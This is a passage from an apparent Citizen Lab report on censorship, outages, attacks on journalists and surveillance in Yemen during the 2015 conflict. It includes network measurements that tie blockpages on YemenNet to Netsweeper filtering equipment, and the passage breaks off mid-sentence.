Internet speeds according to an official at YemenNet quoted by local media. Yemen’s National Security Agency was established (in Arabic) in August 2002 by a presidential decree issued by then president Ali Abdullah Saleh, which established that its objectives are: to gather and make available intelligence related to Yemen’s national security, to reveal and combat activities that sabotage Yemen’s security, and to secure Yemen’s borders and prevent penetration of foreign elements.\nFigure 1 shows the centrality of YemenNet to the country’s international connectivity.\nFigure 1: Map of YemenNet’s international connectivity. (Image courtesy Dyn)\nPre-conflict Internet Filtering in Yemen\nPrior to the conflict, Yemen had a long track record of filtering political content. The OpenNet Initiative (ONI) documented Internet filtering in the country dating back to 2006. Network measurement results from 2006 showed filtering of content from a variety of content categories, including pornography, anonymization tools, LGBT issues, and a small number of opposition political groups. Results from 2009 showed an increase in political filtering, including websites of opposition political groups and independent media. Interestingly, while filtering of some types of content (like pornography) was implemented with a descriptive blockpage noting the reason the content was blocked, political content was blocked using injected TCP reset packets, a non-transparent method meant to emulate network connectivity problems. This covert blocking of political content provides plausible deniability to the government that is censoring constitutionally protected speech, while other types of content, like pornography, are blocked openly based on Sharia law. Internet censorship during this period was performed with filtering products produced by the U.S.-based company Websense. However, following the ONI’s publication of its reports, the company blocked access to software updates from Yemen. Later ONI research showed that the ISP YemenNet had switched to the products of Canada-based Netsweeper to implement filtering.\nPart 1: Information Controls in Yemen in 2015\nThe following sections elaborate on several different forms of information control in Yemen during the 2015 conflict. We review the impact of the attacks on national electricity grids and the information environment in Yemen and how the scarcity of fuel and manipulation of its sale in a black market contributed to limiting alternative power generating methods needed to keep information infrastructure operational. We examine traffic data to Google services from Yemen against reports of power outages in the country, and use reports from the Internet performance monitoring company, Dyn, showing Internet outages. We then assess how these disruptions serve the interests of the parties involved in the political and armed conflict. We also review attacks on media professionals and outlets, reports of expanded Internet filtering, politically motivated breaching of websites, digital surveillance, and removal of TV channels from satellite operators.\nElectricity and information control\nFigure 2: Fuel truck unloads and sells gas in the streets of the Houthi-controlled capital city of Sana’a, instead of gas stations where it can be sold at official price. (Photo credit: Naser Noor)\nInformation and communication technologies require electrical power for operation, and so access to electricity is a fundamental element of information control. Frequent attacks on national electricity grids have disrupted access to telecommunication and Internet services. Google real-time data of traffic to its products and services shows a sharp drop in traffic on certain dates. We examined these dates against media reports on attacks on electricity grids and found a correlation. Figure 3 shows sharp drops occurring occasionally, such as on the week of February 3 and the week of September 12, 2014. Media articles report attacks on electricity system on these weeks.\nFigure 3: Traffic data to Google services from Yemen, showing frequent disruptions during 2014. [Source]As the armed conflict intensified, access to electricity has been heavily disrupted. National electrical lines were destroyed in June 2014 as a result of violence in the governorate of Marib, which houses the country’s primary power plant. Engineers from the Ministry of Electricity and Power were unable to repair the damaged grid lines in the active conflict zone amid conflicting accusations of who is responsible for disobeying a ceasefire. Similarly, much of the country was left without electricity on April 13, 2015 following an attack on power transmission lines.\nThe electrical shutdown combined with the severe shortage of fuel needed to operate household generators (for those who can afford them) has resulted in citizens without access to television or the ability to power computers or mobile phones. The Annual report of the United Nations High Commissioner for Human Rights and reports of the Office of the High Commissioner and the Secretary-General stated that Saudi-led coalition caused fuel scarcity in the local market, saying: “Severe import restrictions, caused mainly by the naval blockade imposed by the coalition forces during the conflict, have also aggravated the humanitarian situation, resulting in fuel scarcity, which adversely affects the distribution of food and water, as well as the functionality of hospitals.”\nFigure 4: Long line of taxis waiting for gas to be available at a gas station in the city of Sana’a. (Photo credit: Naser Noor)\nMoreover, local media has reported (in Arabic) that the Houthis have created and operated a black market for fuel so that they can sell it at a much higher price to finance their military operations. The reports publish photos of what they describe as gas trucks unloading and selling in the streets instead of delivering the fuel to gas stations where it can be sold at the official price (see also Figure 2 above). The lack of easy access to fuel has also brought about scarcity in access to information. Without fuel to power generators, and thus electrical powered computers and television, battery-operated radios have become the primary source of information. Notably, the only local radio news stations available are Sana’a Radio Station, which is government-operated, and al-Masirah, the official Houthi radio station. Like many government media institutions, the Sana’a Radio Station is controlled by the Houthis since they took control of the capital city of Sana’a. As a result, the editorial policy of government radio reflects Houthis’ political points of view, and the station is essentially a mirror of al-Houthi’s official radio, al-Masirah. Therefore, Yemenis are left with news and views reflecting a single political opinion.\nMoreover, the significantly degraded telecommunication services and unavailability of fuel have had a direct detrimental impact on the lives of civilians living in active military operations. The Annual Report of the United Nations High Commissioner for Human Rights and reports of the Office of the High Commissioner and the Secretary-General notes that in May 2015 the Saudi-led coalition forces declared a military operation against the Houthis stronghold governorate, Sa’ada, and warned civilians to stay away from what they said were Houthi locations and crowds. The forces declared the cities of Marran and Sa’ada military zones. The report states that “[a]ccording to Saudi State television channel Al-Ekhbariya, flyers announcing the operation were released over Old Sa’ada”, however “the limited availability of fuel, the particularly challenging terrain, and barely operational telecommunications services prevented tens of thousands of civilians from complying with the ultimatum launched by the coalition.” The same report says OHCHR later observed that coalition air strikes hit at least six residential homes and five markets, but it was not able to obtain detailed information on resulting casualties.\nThe electricity outage and shortages in fuel have affected other forms of media as well. A number of newspapers have ceased to publish due to the lack of power, and some websites, such as the news portal News Live, announced (in Arabic) they are no longer able to publish as the telecommunication disruption has left them unable to receive updates.\nAs disruptions to electricity can be caused by violence or deliberate manipulation, they are often accompanied by mutual accusations of responsibility. Power outages can also have coincidental impacts that benefit some groups over others. Although we cannot determine which side of the armed conflict is responsible for all the disruptions, power outages as a whole appear on balance to favour the Houthis and their strategy of degrading information flows. Accusations that they are manipulating fuel supplies as part of a broader information control strategy warrants further research, a topic to which we return again in the next section.\nFigure 5: A busy street in Sana’a in total darkness because of electricity shutdown, except for the lights of the cars.

(Photo credit: Naser Noor)\nInternet and telecom disruptions\nSimilar to disruptions during the 2011 revolution in Egypt or the ongoing Syrian conflict, international telecommunications connectivity in Yemen has been either completely or partially disrupted several times during the armed conflict. The number of routing instabilities has increased since the conflict escalated in late March 2015, as shown in Figure 7:\nFigure 7: Traffic data showing increase in unstable networks and unavailable networks in Yemen. (Image courtesy Dyn)\nOn March 31, 2015, international telecommunications services to and from Yemen were cut off briefly by the Houthi-controlled Ministry of Communications and Information Technology. At the end of March and in early April 2015, another outage occurred affecting Yemen’s submarine fiber connection to neighbouring Djibouti (See Figure 8) — particularly problematic as Yemen has only two international submarine fiber connections.\nFigure 8: Traffic data from YemenNet showing impact of disrupted submarine fiber cable. Source: Dyn\nReports emerged on April 7, 2015 that the Ministry of Communications and Information Technology had cut off phone and Internet connections in the city of Aden following fighting between supporters of president Hadi and Houthi rebels. On April 12, Internet connectivity was disrupted in numerous cities throughout the country. Conflicting reports from local media attributed this disruption to a severed international fibre optic cable, while others suggested the disruption was a result of the installation of filtering and surveillance equipment on the national network by the Ministry of Communications and Information Technology.\nIn late April and early May 2015, telecommunications systems were at risk of going offline as a result of fuel shortages throughout the country. On April 28, local media reported that Houthi rebels had seized gasoline and diesel shipments intended for humanitarian relief, including shipments intended for telecommunications providers, who had been relying on generators as a result of instability in electrical infrastructure. As a result, the Ministry of Communications and Information Technology announced that it would sever Internet access in four governorates (Aden, Dhale, Abyan and Lahj) on May 1 as a result of the fuel shortages. Days later, local media reported that the Ministry of Communications and Information Technology announced that this shutdown would extend to the entire country, beginning on May 4 at 9:00am. However, the Ministry later announced that they had secured the required fuel to maintain telecommunications service and a shutdown was avoided.\nOther data sources have illustrated the impacts of disrupted Internet traffic and widespread power outages. Figure 9 shows traffic from Yemen to Google’s search services, with the red arrow showing the steep drop-off in traffic on April 13, 2015, the date of a major power outage in the country.\nFigure 9: Traffic data from Yemen to Google Search services showing significant disruption beginning in mid-April 2015.\nBeginning May 30, 2015 there was a further disruption on YemenNet affecting its upstream link to upstream provider Reliance, as shown in Figure 10:\nFigure 10: Traffic data showing May 30 disruption between the ISP YemenNet and upstream connection Reliance. (Image courtesy Dyn)\nConflicting reports emerged about the cause of this disruption. The Houthi-controlled Ministry of Communications and Information Technology claimed the disruption was the result of damage to fibre optic cables in a number of locations. Local media sources disputed this account, instead attributing the outage to increased filtering by the Houthi-controlled Ministry, citing individuals who used circumvention software to access sites which were otherwise inaccessible — an act which would not be possible if the disruption was caused by fibre optic cable damage.\nInternet filtering\nFollowing the 2015 Houthi takeover of power, the scope of filtered content in Yemen has increased. Reports emerged that the Ministry of Communications and Information Technology, under the control of the Houthis, began blocking additional independent news websites including Mareb Press, Yemen Voice, Sahafa Net, Al-Sahwa Net, and Yemen Press. This increase in blocking was condemned by the Yemen chapter of the Internet Society.\nIn June 2015, in response to the increase in political filtering, a number of Yemeni websites and journalists established (in Arabic) the Electronic Media League to Fight Website Blocking. The League agreed to collectively adopt a new editorial policy, including the use of specific terminology to describe the Houthis. For example, they agreed to refer to Houthi leader Abdulmalik Al-Houthis as the “rebel,” and the Houthi movement as the “rebel movement” and the “rebel Houthi militia.” The league promised further media escalation and criticized the Houthi movement for trying to enforce an information blackout and create tensions with the media.\nThere have also been reports of an increase in Internet filtering on the other side of the military conflict, in Saudi Arabia. On April 28, local media reported that the Saudi authorities blocked Yemeni government news websites controlled by the Houthi rebels and websites affiliated with ousted president Saleh, an ally of the Houthis. Other media reports said Saudi authorities are censoring clerics who criticize the Kingdom’s military intervention in Yemen.\nWe provide a detailed analysis of our own testing of Internet content filtering in Yemen, Saudi Arabia and Iran in Part 2 of this report.\nTargeting journalists and media outlets\nAfter seizing power in September 2014, Houthi forces targeted media outlets and journalists through raids, kidnapping and harassment. Reports emerged that gunmen raided at least four news outlets, detaining staff and confiscating equipment. Other reports have said the Houthis continue to target journalists, media outlets and media support institutions by means of death threats, abduction and looting, with at least 67 cases of such methods (as of March 2015) used to stop journalists from doing their work.\nAnother report says Yemeni journalists face their “toughest times ever” as a result of the Houthi militia’s violations of press freedoms, which have included kidnapping, detention and physical aggression, beatings, and forced disappearance of journalists working for local and international media outlets. The report adds that these violations, as well as an economic recession and the shortage of fuel, have forced many local independent media to stop printing and cease operating their online presences, leaving the market solely with media owned by the Houthis and Saleh, whose control over government financial institutions allows them to finance such media using public money.\nIn April 2015, the Houthis launched an investigation into 39 politicians, activists, and journalists for allegedly compromising “the country’s independence, unity and territorial integrity.” The figures include Yemen’s Nobel Peace Prize laureate Tawakkol Karman and reporters of local TV stations. Also in April 2015, Yemeni journalist Waheed al-Sufi was reported to have been kidnapped by armed gunmen, and his current whereabouts are unknown.\nActivists accuse the rebels of intentionally imprisoning their opponents in military sites known to be coalition targets. On May 20, two Yemeni TV journalists were abducted by militiamen allegedly aligned with the Houthis. Also in May, local and regional media reported that Houthis used kidnapped journalists as human shields at military locations, and as a result two journalists were killed in airstrikes. In August 2015, it was reported that 11 journalists remain held hostage by the Houthis, 9 of which were abducted simultaneously in Sanaa in June.\nAfter having its offices raided and its website blocked, news website Almasdar Online moved its operations outside of Yemen. Mobile phone operators reported that they have received orders from the Houthi rebels to stop the news alert services sent by media organizations to mobile phones.\nIn March 2015, the Houthi rebels raided and shut down local TV channels including Suhail TV, Yemen Youth TV, Al-Saeedah TV, Maeen TV and the office of the pan Arab Aljazeera TV.\nThe Houthis have also shut down radio stations. In September 2014, they raided (in Arabic) the headquarters of local social radio station Hayat FM and confiscated its equipment. The equipment was returned to the radio station after negotiations with the Houthis, but the Houthis raided and shut down the station again in June 2015. The station remains shut down as of the writing of this report.\nBecause the government of President Hadi lost control over government news websites, including the official state news agency Saba News, it launched a new Saba News website in May 2015 with the same design but a slightly different domain name (http://sabanew.net/ as an alternative for http://sabanews.net). The website was to represent the “legitimate” government and act as an alternative to the original Saba website that has been under the control of Houthi rebels. The Houthi-controlled Saba news agency later issued a statement describing the new website as fake and a moral and intellectual crime. In an attempt to reach out to citizens inside Yemen, the Saba News website, which is run by the internationally recognized government launched (in Arabic) in August 2015 a news update service via the application WhatsApp. It asked users to subscribe to the service by adding the Egypt-based phone number 00201151665166. It also launched a news update application for Android mobile devices.\nFigure 11: Screenshot from Yemeni private TV channel Azaal TV. Arabic banner says: “The terrorist Houthi militia continues to occupy Azaal TV station headquarters in Sana’a after it raided it, confiscated its equipment, and expelled its staff.” (Photo credit: Naser Noor)\nIn September 2015, the Yemeni coalition for monitoring human rights violations discussed (in Arabic) at the Office of Human Rights Commission in Geneva what it called the “documented atrocities of the Houthi and Saleh militias” committed between September 21, 2014 and August 15, 2015. The coalition documented offenses including the Houthi confiscation of most government-own media outlets and their controlling of the Ministry of Communications and Information Technology and the national ISP YemenNet, “which enabled it to block 61 websites.”\nSaudi-led coalition forces have been accused of targeting Yemeni media outlets. In April 2015 for example, a blast caused by a coalition airstrike in Sana’a killed a TV journalist and three staff members of the Satellite TV station Yemen Today, which is affiliated with ex-president Saleh. The manager of the TV station accused the coalition of targeting the media outlet because Saleh is an alley of the Houthis. A few weeks earlier, the collation spokesperson had said that media outlets supporting the Houthi rebels would be targeted, but he did not explain how. An email request for explanation from the Committee to Protect Journalists that was sent to the Saudi Embassy in Washington was not answered.\nContestation over TV broadcasts\nYemeni TV channels operated by the competing political and armed parties have been the focus of contestation. While Houthis used their military power to raid, physically control, and editorially shape the state-run TV stations, the government of president Hadi used its political influence to have these channels taken off air by the regional satellite providers covering the Middle East and North Africa. State-run television channel Aden TV, which prior to the Houthi takeover had been under the control of the government of President Hadi, has been the object of intense contestation. In February 2015 the Houthis hijacked the broadcast frequencies of the channel, forcing the channel to resume broadcasting on new frequencies. Further back-and-forth hijacking attempts continued in March.\nThe contestation continued at another level. In March, the two primary regional satellite broadcasters, Egypt-based Nilesat and Saudi-based Arabsat, stopped broadcasts of Yemeni state-run channels at the request of President Hadi after the channels fell under Houthi control. In May, Nilesat dropped the Houthi-owned channel Al-Masirah, knocking it off the air for millions of subscribers in the Middle East and North Africa. The channel would later advertise new frequencies on a Russian satellite. Also in May, Nilesat stopped broadcasting Yemeni TV channel Yemen Today, which is owned by toppled president Saleh. Saleh has been targeted by the Saudi-led coalition for backing the Houthi rebels; on May 10 his house in Sana’a was destroyed by airstrikes. There have been no statements from either Nilesat or Arabsat as to which specific party requested the TV channels be dropped, nor have there been any official statements about the legal frameworks used to take such a measure by either of the satellite providers. We sent queries to the broadcasters (Nilesat and Arabsat) seeking an explanation on October 15, 2015, but as of the time of publication have not received a reply.\nElectronic surveillance\nForeign and domestic electronic surveillance is widespread in Yemen, existing prior to as well as during the current armed conflict. Political rivals have allegedly conducted surveillance on their political enemies throughout the ongoing armed conflict. For example, amidst the political rift between the Houthis and President Hadi in January 2015, the Houthis broadcast (in Arabic) on their TV station al-Masirah a telephone conversation between Hadi and his office manager discussing political issues that the Houthis criticized. In the same month, al-Jazeera broadcast a leaked telephone conversation allegedly between ex-president Saleh and a Houthi leader “apparently coordinating military and political moves.” The government of President Hadi has accused Iran of operating spy cells in Yemen that include members of the Iranian Revolutionary Guard, for the purpose of aiding the Houthis. The Minister of Interior in the government of President Hadi said (in Arabic) Iranian-made advanced surveillance and wiretapping equipment was found in Aden in July 2015 after fighters loyal to the government of president Hadi regained control of the area.\nThe Saudi airstrikes have been in part guided by intelligence from aerial surveillance performed by the United States, with American military planners “using live intelligence feeds from surveillance flights over Yemen to help Saudi Arabia decide what and where to bomb,” while also monitoring the Saudi-Yemen border for potential security threats. Such intelligence sharing is a continuation of a long-standing American surveillance program aimed at identifying and locating members of AQAP. This program has included the use of predator surveillance drones and “sophisticated surveillance and electronic eavesdropping systems operated by spy services including the National Security Agency.”1\nSince seizing power, the Houthi rebels have also allegedly sought to conduct surveillance activities. Aden Telecom General Manager Abdulbasit Al-Faqih accused the Houthi rebels of wiretapping telecommunications in the country. In an interview with local media, he claimed that Houthi rebels actively wiretap communications in Yemen, and that the country’s national security agency in Sana’a, which is under the control of the Houthis, possesses surveillance equipment. The official told the media that “the Houthis now wiretap all of our communications, and they can wiretap my telephone call with you now.” He added that the equipment provided by Washington to conduct counterterrorism in Yemen is now being used by the Houthis, adding that telecom offices in Aden do not have the capacity to wiretap communications and as a result the activities of the rebels cannot be tracked. The official claimed that Houthi rebels, especially their key leaders, use Thuraya equipment for communications, which implies that they have an alternative communication system.\nSocial media posts have also suggested that the mobile phones of killed or captured anti-Houthi fighters were examined to identify contacts and conversations, particularly messages shared over the messaging application Whatsapp.\nOn May 31, 2015, a local news website quoted (in Arabic) an unnamed source at Yemen Mobile, a mobile phone provider in Yemen, as saying that the Houthis and allies of ousted president Saleh are using the mobile network to monitor calls and text messages, as well as to perform round-the-clock surveillance on the location of their opponents to determine their movements in armed conflict zones. The company denied the allegations in a statement, saying it respects the privacy of its users according to the law, and that Houthis do not interfere in the company’s affairs. Another mobile company, Y GSM, issued a statement denying similar accusations that appeared in the local media. We cannot independently verify these claims at this time.\nEmail messages leaked from the spyware firm Hacking Team show that multiple requests were made from companies in Yemen seeking assistance deploying surveillance tools in the country. In May 2013 an individual from an IT contractor in Yemen contacted Hacking Team, stating they they were a customer of the Yemeni National Security Agency and were looking for more information on Hacking Team’s Da Vinci interception system. Similarly, in March 2015 a separate IT contractor in Yemen contacted the company requesting assistance, claiming to be the CEO of an IT security company who had a contract with Yemen’s NSA to “develop systems, training & set up of a powerful tool to monitor, intervene, analyze, locate & control the total Telecom spectrum of the Republic of Yemen.” It is not clear from the leaked email threads whether either of the companies procured Hacking Team’s products or services. None of the scans we have undertaken as part of Citizen Lab research on Hacking Team and Finfisher so far have shown evidence of Yemen-based control servers.\nTargeted digital attacks\nTargeted digital attacks have become a regular feature of conflict in recent years, particularly in the Middle East and North Africa. The Syrian Electronic Army has targeted websites for defacement in order to spread pro-regime messages since 2011. Similarly, a group known as the Yemen Cyber Army has emerged to take credit for a number of notable compromises.\nIn April 2015, individuals identifying themselves as the Yemen Cyber Army compromised the website of pan-Arab newspaper al-Hayat, displaying a photo of Hezbollah leader Hassan Nasrallah as well as slogans used by the Houthis. On May 22, 2015, as the Saudi-led airstrikes in Yemen continued, the Yemen Cyber Army claimed responsibility for compromising computer networks of the Saudi government Ministries of Foreign Affairs, Interior, and Defense, and leaking what it called top secret documents revealing spies’ identities, according to Russian news agency Russia Today. An official from the Saudi Ministry of Foreign Affairs acknowledged the compromise in a statement released by the government official press agency. The official said the computer networks at the Ministry of Foreign Affairs were targeted and that an investigation had been launched in coordination with other concerned authorities in the Kingdom. The official warned that the compromise should not be exploited to produce and disseminate fake documents, adding that disseminating such documents helps the “enemies” of the Kingdom, and is criminalized by the Kingdom’s Anti-Cyber Crime Law. Iran’s Fars News Agency reported on the compromise and included links to the alleged leaked documents. Iran’s Press TV also ran a report on the incident.\nIn July 2015, the Yemen Cyber Army reportedly released a list of 23 websites of Saudi companies which were to be targeted for attack, although there has been no evidence that any of the websites have been affected. However the group’s alleged links to Yemen have been contested. Multiple security experts have suggested, based on the infrastructure used to distribute compromised data and the malware used to conduct the Saudi Ministry of Foreign Affairs compromise, that the attackers are more likely Iranian and may be sponsored by the Iranian government.\nIn September 2015 the website of the Indian Bureau of Energy Efficiency was compromised and defaced with a messaging attributing the defacement to the “Yemeni Electronic Army”.\nPart 2: Network Measurement Results\nThis section examines the results of our tests for filtering of web content in Yemen, Saudi Arabia, and Iran in the context of the political and armed conflict in Yemen. The three countries, as already described, were significant censors of web content before the conflict began and reports have emerged suggesting that censorship has expanded in each of the countries as the conflict escalated. Network measurements in Saudi Arabia and Iran show the degree to which the conflict has been internationalized, with contests over information controls extending beyond Yemen’s borders and impacting each country’s censorship practices.\nWe ran network measurement tests to determine what content was censored, how censorship was applied, whether the censorship was transparent or not, and if the technology used to implement web censorship could be identified. In addition, knowing that censorship in Yemen has previously been implemented with technology from Canada-based Netsweeper, we sought to determine if a Netsweeper installation was still active in Yemen, and if so whether it was communicating with or otherwise receiving updates from Netsweeper servers. Any provision of corporate services to YemenNet, a state-owned and operated national ISP that is now controlled by the Houthi rebels, raises a number of questions regarding corporate social responsibility and complicity in information controls tied to armed conflict (which we address later in the report).\nPart of the research for this report, including a portion of the network measurement tests, was undertaken by an independent researcher in collaboration with the Citizen Lab from within Yemen. The researcher happened to be stranded in the country during part of the armed conflict period, and was not requested by Citizen Lab to travel to Yemen for research purposes. Network measurements run with the ICLAB platform are conducted under a research protocol that has been reviewed and approved by the University of Toronto’s Research Ethics Board. That protocol explicitly restricts undertaking research in high risk environments, including zones of conflict, and in previous work we have avoided running measurements in such environments. However, gauging risks is always difficult as the situation on the ground is fluid and dynamic, and can change quickly.2 The independent researcher was fully cognizant of these risks and gave free and informed consent to conduct the research. We maintained regular consultations about evaluating the level of risk involved in running tests and undertaking field research. Throughout this project, efforts were made to mitigate the risk as much as possible. Once the armed conflict in Yemen became particularly acute, we ceased all field research and network measurements.\na. Yemen\nSoon after the conflict began, reports emerged that the Houthi-controlled Ministry of Communications and Information Technology in Yemen had added new websites to the list of censored websites in the country. In order to confirm these reports of increased filtering, we performed network measurement tests to identify the types of content filtered and the method of filtering.\nFigure 12: A user in Yemen receiving a “Not Found” error page when trying to access news portal sahafah.net (Photo credit: Naser Noor)\nFrom March to July 2015, we conducted network measurement tests on networks in Yemen. Measurements were conducted using the ICLab platform. These tests consisted of a software client performing an HTTP GET request for a predefined list of URLs, and collecting the responses. These responses were analyzed to identify instances of deliberate filtering.\nThe sample of URLs tested consisted of two lists. The first list was the list of top 500 most popular websites as determined by Alexa. The second list was specific to Yemen’s local political, social, and cultural context, including websites representing those who are believed to be aligned with the government of president Hadi; the Houthis, ex-president Ali Abdullah Saleh, and political parties; government media; partisan and nonpartisan media; independent news portals; NGOs and advocacy groups; discussion forums; and a collection of apolitical cultural and entertainment websites. In total, 793 URLs were tested in Yemen. The full list of tested URLs can be found in the Data section below.\nIn some cases, as reports emerged of new content being blocked, we added relevant URLs to the testing list. In addition, after initial test results showed that all URLs on our list using the Israel top-level domain (.il) were blocked, we included additional .il URLs to determine if all such URLs were blocked.\nThe testing lists are not comprehensive and do not attempt to identify every URL that may be blocked. Rather, they are a snapshot of potentially sensitive or reportedly blocked URLs covering a range of relevant content categories.\nIn addition, we conducted network scans using the search engine Shodan and other tools aimed at identifying instances of Netsweeper installations in Yemen.\nTests were performed on the ISP YemenNet. Analysis of the data gathered on YemenNet showed a number of test results that we believe reflect deliberate attempts to filter content. This filtering took two forms: A descriptive Netsweeper blockpage and a ‘404 Not Found’ error page. The descriptive blockpage clearly indicated that the content was blocked, while the ‘404 Not Found’ page was designed to emulate a technical error. Thus, some content was openly blocked (transparent) while other types of content were blocked with a response designed to confuse users (non-transparent).\nNetsweeper blockpage\nThe first form of filtering returned a series of similar blockpages like the one shown in Figure 13:\nFigure 13: Descriptive Netsweeper blockpage for an attempt to access playboy.com\nThis blockpage transparently identified the content as blocked, the category of the content (in most cases), and provided a method for disputing this categorization. The HTML source of this blockpage looked as follows: (requesting IP address has been redacted)\nThis page source, in particular the string ‘/webadmin/deny’, is consistent with the use of Netsweeper filtering products. In addition, an alternate version of the blockpage with the Netsweeper logo can be found hosted at the same IP address at http://82.114.160.94/webadmin/deny/?dpid=2, as shown in Figure 14:\nFigure 14: Alternate version of the blockpage containing the Netsweeper logo hosted on YemenNet.\nThere are a number of data points related to this Netsweeper installation that we can identify from this page source. First, we are able to determine the content category Netsweeper has assigned to a given URL from this blockpage text. Each content category is given a unique number by Netsweeper, including the custom category fields which may be created by systems administrators. For example, the text fragment “&cat=23” shown in the above HTML source indicates that this URL belongs to Netsweeper category number 23 (‘Pornography’), which matches the description shown in the blockpage displayed in Figure 13. In total, we identified four blocked content categories: Pornography (23), Web Proxy (32), Nudity (3) and Custom (105). While the Pornography, Web Proxy, and Nudity categories are predefined by Netsweeper, the Custom category was likely created and maintained by system administrators at YemenNet.\nBlocked URLs that belonged to the ‘Web Proxy’ category triggered the blockpage seen in Figure 15:\nFigure 15: Blockpage displayed for URLs categorized as ‘Web Proxy’ by Netsweeper\nFor blocked URLs that belonged to the ‘Nudity’ category, the blockpage shown in Figure 16 was displayed:\nFigure 16: Blockpage displayed for URLs categorized as ‘Nudity’ by Netsweeper\nFor blocked URLs that belonged to the ‘Custom’ category, the blockpage containing the more generic text “Your administrator has blocked this site” as shown in Figure 17 was displayed:\nFigure 17: Blockpage displayed for URLs belonging to the ‘Custom’ category\nThe breakdown of URLs found blocked in each category, as a percentage of total blockpages returned, is shown in Figure 18:\nFigure 18: Proportion of all URLs found blocked belonging to the four blocked content categories\nThe Custom category contained primarily URLs belonging to the Israel ccTLD (more about this below) as well as three additional URLs:\n\nhttp://www.ahewar.org\nhttp://answering-islam.org\nhttp://christian-dogma.com\n\nWe discuss the blocked content in more detail later in this report.\nThere was some variability in filtering across the testing time period. For those URLs found blocked with a Netsweeper blockpage, the proportion of tests for which that URL was found to be blocked ranged from 78% to 100%, as shown in Figure 19:\nFigure 19: Proportion of tests in which each URL was found to be blocked, out of all URLs that triggered a Netsweeper blockpage at least once.\nIt is not clear why certain URLs were accessible during a small number of tests. Previous research by ONI identified a lack of concurrent Websense user licenses as the reason why blocking was intermittent: when the number of users accessing the Internet exceeded the limited number of user licenses, no blocking was applied. It is unknown whether a similar limitation with the Netsweeper installation is the cause of this variability. We also searched for but did not find a conclusive link between reports of network disruptions and variability in filtering.\nNon-transparent blockpage\nIn addition to the transparent Netsweeper blockpage, during our attempts to access other types of content we were presented with the page displayed in Figure 20:\nFigure 20: HTTP 404 error displayed during an attempt to access sahafah.net on YemenNet\nThis HTTP 404 error page is a standard server error and is not, on its own, indicative of censorship. However, a number of characteristics of the response seen in Figure 20 reveal it is in fact a result of deliberate censorship.\nInterestingly, we found evidence that the HTTP 404 messages originated from the same device as the Netsweeper blockpage. This finding is significant, as it suggests that the Netsweeper installation is responsible for both the transparent and nontransparent blockpages. To ascertain that these replies indeed originated from the same device in the network, we considered the values of the IPID and TTL headers in the HTTP responses. We leverage the value of these headers as seen in the TCP SYNACK packet as a baseline to compare against. The SYNACK packet represents the first response received by the client from the server, and (if a packet injecting censor is slow to act) the SYNACK packet can give us insight into how the actual server sets these header values.\nIPID header comparison. The IPID header can be set differently depending on the operating system of the device that generates the network packet (e.g., some will set it to 0, while others may increment it based on packets sent). We compared the IPID values between the SYNACK packet, presumably the first reply from the server, and the packet containing the HTTP response. Figure 21 shows the result. In the SYNACK packet, the majority of servers set the IPID value to 0 (not shown on the logscale figure). In contrast, the IPID in the packet containing the HTTP reply (either HTTP 404 or blockpage) was consistently set to the value of 242. This very consistent and specific setting of the IPID header is in line with the same device being used to generate both the HTTP 404 and blockpage responses. In the case of HTTP 404 responses, the difference in IPID between the SYNACK packet and the HTTP reply also corroborates that it is not the actual web server generating the HTTP 404 response.\na. IPID Values for tested URLs that resulted in an HTTP 404 page being returned\nb. IPID values for tested URLs that resulted in a blockpage being returned\nFigure 21. Comparison of IPID values between the initial response from the server (the TCP SYNACK packet) and the response carrying the HTTP 404 or blockpage result. Note the consistent IPID value of 242 between the HTTP 404 and blockpage results.\nTTL header comparison. The IP TTL header is initially set to a value of 255 (or 128) and decremented at each hop as a packet traverses the network. The TTL value can give us a hint at how far the server is from the client (in terms of routers). Figure 22 compares the TTL values between the SYNACK packet and the packet containing the HTTP reply. We see the TTL values for SYNACK packets ranged from 40 and 55 (for sites that were hosted outside of the Middle East), around 100 for sites hosted in the Middle East (e.g., Israel) and 200 for sites hosted in Arab countries. In contrast, we observed a consistent TTL value of 60 for the packets containing the HTTP 404 or blockpage replies. This finding provides further evidence that these responses are generated by a device located at the same point in the network. Again, the difference between the SYNACK packet and HTTP 404 response indicates that these responses were not generated by the web server in the case of the 404 response.\na. TTL values for URLs that resulted in an HTTP 404 page being returned\nb. TTL values for URLs that resulted in a blockpage being returned\n\nFigure 22: Comparison of TTL values between the initial response from the server (the TCP SYNACK packet) and the response carrying the HTTP 404 or blockpage result. Note the consistent TTL value of 60 between the HTTP 404 and blockpage results.\n\nThis specific HTTP 404 error response was received exclusively during attempts to access Yemen-focused critical news websites. Further analysis of the blocked content can be found below.\nOur test results showed that this response was not consistent across all tests. Some URLs received this response during every test, while for others there were periodic instances in which the website was accessible. In some cases the website was accessible for only one or two tests, while in others the URL was accessible during most tests until it appears to have been added to the list of blocked content during later tests. The following table displays the URLs that received the HTTP 404 error, and the percentage of tests in which this response was received:\nFigure 23: Shodan search results for devices returning CentOS version string in Yemen\nAs with the results seen with the transparent Netsweeper blockpage, as shown in Figure 19, it is not clear why certain URLs were accessible in some tests and blocked during others.\nAdditional network scans\nIn addition to tests of website accessibility in Yemen, we also conducted remote network scans of the YemenNet network to identify filtering infrastructure, and to provide further confirmation of Netsweeper’s products.\nFirst, we used Shodan, a search engine that provides information on devices connected to the Internet. We have previously used Shodan to identify the presence of Netsweeper devices in Somalia and Pakistan. Using the IP we see explicitly in the blockpage (82.114.160.94) as a starting point, Shodan shows the following string in its SNMP description:\nLinux localhost.localdomain 2.6.32-358.2.1.el6.x86_64 #1 SMP Wed Mar 13 00:26:49 UTC 2013 x86_64\nThis Linux kernel version number is consistent with the naming scheme of the Linux distribution CentOS, which Netsweeper is built upon. After searching for the string “2.6.32-358.2.1.el6.x86_64” and restricting the results to Yemen, Shodan identified the devices shown in Figure 24:\nFigure 24: Shodan search results for devices returning CentOS version string in Yemen\nWe then verify each IP by opening them in a browser and ensuring that the signature of the URL pattern “/webadmin/” is present, as well as visiting the IPs to verify the default Netsweeper content is present. Based on these results we are able to sketch out an illustration of the Netsweeper infrastructure, as shown in Figure 25:\nFigure 25: Illustration of YemenNet’s Netsweeper filtering infrastructure\nThere are three main components to the Netsweeper installation in YemenNet: a single deny page server that presents the blockpage to users; six policy servers that make the decision about what to block; and three servers dedicated to the web interface that administrators use to set new filtering policies and get reports about user traffic.\nThe deny page server is hosted on 82.114.160.94 and is seen in the source code of any blockpage as an embedded iframe, as described earlier in this report. There are two configurations that suggest that the primary use of this server is to serve blockpages. First, Netsweeper blockpages are served according to a deny page ID parameter (dpid) in the URL. For example, a block URL formatted as ‘http://127.0.0.1/webadmin/deny/index.php?dpid=1’ would serve one blockpage while 